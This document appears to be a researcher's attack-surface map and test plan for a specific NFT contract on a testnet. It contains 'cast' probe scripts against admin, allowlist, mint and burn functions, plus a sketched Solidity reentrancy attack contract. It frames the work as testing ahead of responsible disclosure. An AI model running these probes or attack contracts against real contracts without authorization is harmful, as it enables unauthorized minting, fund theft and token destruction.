# ARCLINGS Attack Surface & Test Plan

**Contract:** 0xEb03AC9cE0DCCbb95c0ecF17C957D979233D97Fd  
**Chain:** Arc Testnet (5042002)  
**Date:** 2026-09-16  
**Researcher:** deviykee

---

## 🎯 ATTACK VECTORS (Prioritized)

### CRITICAL #1: Missing Access Control on Admin Functions

**Functions to test:**
- `adminMint(address,uint256)` - 0x40c10f19
- `adminMintBatch(address[],uint256[])` - 0xa04689d2
- `withdraw()` - 0x3ccfd60b
- `withdrawERC20(address,address,uint256)` - 0x44004cc1
- `setMintPrice(uint256)` - 0xf4a0a528
- `setPhase(uint8)` - 0xc03afb59
- `setMerkleRoot(bytes32)` - 0x7cb64759

**Test Script:**
```bash
#!/bin/bash
TARGET=0xEb03AC9cE0DCCbb95c0ecF17C957D979233D97Fd
RPC=https://rpc.testnet.arc.io
ATTACKER=0x000000000000000000000000000000000000dEaD

echo "=== Testing Admin Functions from Unauthorized Address ==="

# Test adminMint
cast call $TARGET "adminMint(address,uint256)" $ATTACKER 1 \
  --from $ATTACKER --rpc-url $RPC 2>&1 | grep -i "revert\|error\|success"

# Test withdraw
cast call $TARGET "withdraw()" \
  --from $ATTACKER --rpc-url $RPC 2>&1 | grep -i "revert\|error\|success"

# Test setMintPrice to 0
cast call $TARGET "setMintPrice(uint256)" 0 \
  --from $ATTACKER --rpc-url $RPC 2>&1 | grep -i "revert\|error\|success"

# Test setPhase to public (2)
cast call $TARGET "setPhase(uint8)" 2 \
  --from $ATTACKER --rpc-url $RPC 2>&1 | grep -i "revert\|error\|success"

# Test setMerkleRoot to zero
cast call $TARGET "setMerkleRoot(bytes32)" 0x0000000000000000000000000000000000000000000000000000000000000000 \
  --from $ATTACKER --rpc-url $RPC 2>&1 | grep -i "revert\|error\|success"
```

**Expected:** All should revert with "Ownable" or access control error  
**Critical if:** Any function succeeds

---

### CRITICAL #2: Merkle Proof Bypass in Allowlist Mint

**Function:** `allowlistMint(bytes32[],uint256)` - 0x1338a83f

**Attack scenarios:**
1. Empty proof array
2. Invalid proof
3. Proof for different address
4. Replayed proof

**Test Script:**
```bash
# Get current merkle root
MERKLE_ROOT=$(cast call $TARGET "merkleRoot()(bytes32)" --rpc-url $RPC)
echo "Current Merkle Root: $MERKLE_ROOT"

# Test with empty proof array
cast call $TARGET "allowlistMint(bytes32[],uint256)" "[]" 1 \
  --from $ATTACKER --rpc-url $RPC 2>&1

# Test with fake proof
FAKE_PROOF='["0x0000000000000000000000000000000000000000000000000000000000000001"]'
cast call $TARGET "allowlistMint(bytes32[],uint256)" "$FAKE_PROOF" 1 \
  --from $ATTACKER --rpc-url $RPC 2>&1
```

**Expected:** Should revert with proof validation error  
**Critical if:** Mint succeeds with invalid proof

---

### HIGH #3: Supply Cap Bypass via AdminMint

**Functions:**
- `adminMint(address,uint256)` - 0x40c10f19
- `adminMintBatch(address[],uint256[])` - 0xa04689d2
- `MAX_SUPPLY()` - 0x32cb6b0c (returns 6283 / 0x188b)

**Test:**
```bash
# Check supply cap
MAX=$(cast call $TARGET "MAX_SUPPLY()(uint256)" --rpc-url $RPC)
echo "Max Supply: $MAX"  # Should be 6283

CURRENT=$(cast call $TARGET "totalSupply()(uint256)" --rpc-url $RPC)
echo "Current Supply: $CURRENT"

# Calculate remaining
REMAINING=$((MAX - CURRENT))
echo "Remaining: $REMAINING"

# If owner access (authorized test):
# Try to mint beyond cap
OVER_AMOUNT=$((REMAINING + 1))
# cast send $TARGET "adminMint(address,uint256)" $YOUR_ADDR $OVER_AMOUNT --from $OWNER
```

**Expected:** Should revert when totalSupply would exceed MAX_SUPPLY  
**Critical if:** Can mint beyond 6283

---

### HIGH #4: Per-Wallet Mint Limit Bypass

**Tracking functions:**
- `numberMintedPublic(address)` - 0x8535923f
- `maxPerWalletPublic()` - 0xb029a514
- `maxPerWalletAllowlist()` - 0x031ee82b

**Test:**
```bash
# Check limits
PUBLIC_LIMIT=$(cast call $TARGET "maxPerWalletPublic()(uint256)" --rpc-url $RPC)
ALLOWLIST_LIMIT=$(cast call $TARGET "maxPerWalletAllowlist()(uint256)" --rpc-url $RPC)

echo "Public Limit: $PUBLIC_LIMIT"
echo "Allowlist Limit: $ALLOWLIST_LIMIT"

# Check your minted count
YOUR_ADDR="0xYourAddress"
MINTED=$(cast call $TARGET "numberMintedPublic(address)(uint256)" $YOUR_ADDR --rpc-url $RPC)
echo "You have minted: $MINTED"

# Test bypass techniques:
# 1. Mint limit, transfer out, mint again
# 2. Multiple addresses in same block
# 3. Cross-phase minting (allowlist + public)
```

**Expected:** Total mints per address should not exceed limit  
**High if:** Can bypass by transferring + re-minting

---

### HIGH #5: Reentrancy in Public Mint

**Function:** `publicMint(uint256)` - 0x2db11544 (payable)

**Test (requires custom contract):**
```solidity
contract ReentrancyAttack {
    address target;
    uint256 mintPrice;
    
    function attack() external payable {
        // Mint with callback
        IERC721(target).publicMint{value: mintPrice}(1);
    }
    
    // ERC721Receiver callback
    function onERC721Received(...) external returns (bytes4) {
        // Try to re-enter publicMint
        if (address(this).balance >= mintPrice) {
            IERC721(target).publicMint{value: mintPrice}(1);
        }
        return this.onERC721Received.selector;
    }
}
```

**Expected:** Should have reentrancy guard  
**Critical if:** Can mint multiple times in one transaction

---

### MEDIUM #6: Phase Transition Manipulation

**Functions:**
- `phase()` - 0xb1c9fe6e (returns enum: 0=Disabled, 1=Allowlist, 2=Public)
- `setPhase(uint8)` - 0xc03afb59

**Test:**
```bash
# Check current phase
PHASE=$(cast call $TARGET "phase()(uint8)" --rpc-url $RPC)
echo "Current Phase: $PHASE"
# 0 = Disabled, 1 = Allowlist, 2 = Public

# Test minting in wrong phase
# If phase=0, try to mint
# If phase=1, try public mint without allowlist
# If phase=2, try allowlist mint
```

**Expected:** Minting should only work in correct phase  
**Medium if:** Phase checks can be bypassed

---

### MEDIUM #7: Transfer Validator Bypass

**Functions:**
- `getTransferValidator()` - 0x098144d4
- `setTransferValidator(address)` - 0xa9fc664e
- `tradingEnabled()` - 0x4ada218b
- `autoApproveTransfersFromValidator()` - 0x6221d13c

**Test:**
```bash
# Check if trading enabled
ENABLED=$(cast call $TARGET "tradingEnabled()(bool)" --rpc-url $RPC)
echo "Trading Enabled: $ENABLED"

# Check validator address
VALIDATOR=$(cast call $TARGET "getTransferValidator()(address)" --rpc-url $RPC)
echo "Transfer Validator: $VALIDATOR"

# If trading disabled, try transfer
# If validator set, check bypass methods:
# - Direct transferFrom vs safeTransferFrom
# - Approve + transferFrom from third party
# - Validator = address(0) case
```

**Expected:** Should enforce trading restrictions  
**Medium if:** Can bypass via approve mechanism

---

### MEDIUM #8: Burn Authorization

**Function:** `burn(uint256)` - 0x42966c68

**Test:**
```bash
# Try to burn someone else's token
OTHER_TOKEN_ID=1
cast call $TARGET "burn(uint256)" $OTHER_TOKEN_ID \
  --from $ATTACKER --rpc-url $RPC 2>&1

# Expected: Should require ownership or approval
```

**Expected:** Only owner/approved can burn  
**Medium if:** Anyone can burn any token

---

### LOW #9: Descriptor Contract Trust

**Functions:**
- `descriptor()` - 0x303e74df
- `setDescriptor(address)` - 0x01b9a397
- `tokenURI(uint256)` - 0xc87b56dd

**Test:**
```bash
# Check descriptor contract
DESC=$(cast call $TARGET "descriptor()(address)" --rpc-url $RPC)
echo "Descriptor Contract: $DESC"

# Get a tokenURI
cast call $TARGET "tokenURI(uint256)(string)" 1 --rpc-url $RPC
```

**Risk:** If descriptor is malicious/upgradeable  
**Impact:** Metadata manipulation, but not fund loss

---

## 🔬 DEEP DIVE AREAS

### Storage Layout (Requires Decompilation)

```
Slot 0: name (string)
Slot 1: symbol (string)
Slot 2-9: ERC721 state
Slot 10 (0x0a): royalty info
Slot 11 (0x0b): token royalties mapping
Slot 12 (0x0c): owner (Ownable)
Slot 13 (0x0d): reentrancy guard
Slot 14 (0x0e): mintPrice
Slot 15 (0x0f): phase (enum)
Slot 16 (0x10): merkleRoot
Slot 17 (0x11): maxPerWalletAllowlist
Slot 18 (0x12): maxPerWalletPublic
Slot 19 (0x13): tradingEnabled
Slot 20+ (0x14+): minter tracking mappings
Slot 26 (0x1a): descriptor address
Slot 27 (0x1b): ? (additional storage)
Slot 28 (0x1c): transferValidator address
```

### Critical Code Paths to Trace

1. **Mint Flow:**
   ```
   publicMint() → _checkPhase() → _checkLimit() → _checkPayment() → _mint()
   ```

2. **Access Control:**
   ```
   onlyOwner modifier → require(msg.sender == owner)
   minterOnly modifier → require(minterAddresses[msg.sender])
   ```

3. **Supply Cap:**
   ```
   _mint() → totalSupply++  → require(totalSupply <= MAX_SUPPLY)
   ```

4. **Merkle Validation:**
   ```
   allowlistMint() → MerkleProof.verify(proof, merkleRoot, leaf)
   leaf = keccak256(abi.encodePacked(msg.sender))
   ```

---

## 📊 RISK SUMMARY

| Vector | Severity | Likelihood | Impact | Priority |
|--------|----------|------------|--------|----------|
| Missing admin access control | Critical | Low | Critical | P0 |
| Merkle proof bypass | Critical | Medium | Critical | P0 |
| Supply cap bypass | High | Low | High | P1 |
| Mint limit bypass | High | Medium | High | P1 |
| Reentrancy | High | Low | Critical | P1 |
| Phase transition exploit | Medium | Medium | Medium | P2 |
| Transfer validator bypass | Medium | High | Medium | P2 |
| Unauthorized burn | Medium | Medium | Low | P3 |

---

## ✅ NEXT ACTIONS

1. **Wait for RPC stability** - Current timeouts blocking active testing
2. **Run auth triage** - Test all admin functions from 0xdead
3. **Test mint flows** - Public, allowlist, limits
4. **Decompile bytecode** - Get full source logic
5. **Contact team** - Request source code for responsible disclosure

---

**Status:** Attack surface mapped. Ready for active testing when RPC accessible.
